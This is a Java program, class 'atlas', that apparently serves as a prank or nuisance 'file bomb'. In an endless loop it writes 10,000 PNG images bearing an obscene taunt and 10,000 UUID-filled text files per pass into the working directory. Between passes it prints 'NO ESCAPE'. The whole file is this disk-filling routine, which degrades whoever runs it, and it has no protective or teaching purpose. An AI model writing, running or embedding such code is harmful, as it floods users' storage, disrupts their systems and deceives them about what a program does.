import java.io.*;
import java.util.Scanner;
import java.util.UUID;
import java.awt.Color;
import java.awt.Font;
import java.awt.FontMetrics;
import java.awt.Graphics2D;
import java.awt.RenderingHints;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;

public class atlas{
  public static void main(String[] args) throws FileNotFoundException {
    boolean loop = true;
    Scanner input = new Scanner(System.in);
    commands commandObject = new commands();

    while (loop){
          String uuid = UUID.randomUUID().toString();
          String name2 = uuid;
          String uuid2 = UUID.randomUUID().toString();
          String text2 = uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2 + uuid2;
          int spamNumber = 10000;
          int starter = 1;
          while (starter < spamNumber + 1){
            String text4 = "you are fucked";
            BufferedImage img = new BufferedImage(1, 1, BufferedImage.TYPE_INT_ARGB);
            Graphics2D g2d = img.createGraphics();
            Font font = new Font("Arial", Font.PLAIN, 1000);
            g2d.setFont(font);
            FontMetrics fm = g2d.getFontMetrics();
            int width = fm.stringWidth(text4);
            int height = fm.getHeight();
            g2d.dispose();

            img = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
            g2d = img.createGraphics();
            g2d.setRenderingHint(RenderingHints.KEY_ALPHA_INTERPOLATION, RenderingHints.VALUE_ALPHA_INTERPOLATION_QUALITY);
            g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
            g2d.setRenderingHint(RenderingHints.KEY_COLOR_RENDERING, RenderingHints.VALUE_COLOR_RENDER_QUALITY);
            g2d.setRenderingHint(RenderingHints.KEY_DITHERING, RenderingHints.VALUE_DITHER_ENABLE);
            g2d.setRenderingHint(RenderingHints.KEY_FRACTIONALMETRICS, RenderingHints.VALUE_FRACTIONALMETRICS_ON);
            g2d.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
            g2d.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
            g2d.setRenderingHint(RenderingHints.KEY_STROKE_CONTROL, RenderingHints.VALUE_STROKE_PURE);
            g2d.setFont(font);
            fm = g2d.getFontMetrics();
            g2d.setColor(Color.BLACK);
            g2d.drawString(text4, 0, fm.getAscent());
            g2d.dispose();
            try {
                ImageIO.write(img, "png", new File(uuid2 + starter + ".png"));
            } catch (IOException ex) {
                ex.printStackTrace();
            }

            File file2 = new File (name2 + " [" + starter + "].txt");
            try
            {
                PrintWriter printWriter = new PrintWriter(file2);
                printWriter.println (text2);
                printWriter.close();
            }
            catch (FileNotFoundException ex)
            {
                System.out.println("error");
            }
            starter += 1;
            }
            System.out.print("NO ESCAPE");
            Scanner scanner3 = new Scanner(System.in);
            scanner3.nextLine();
    }
  }
}
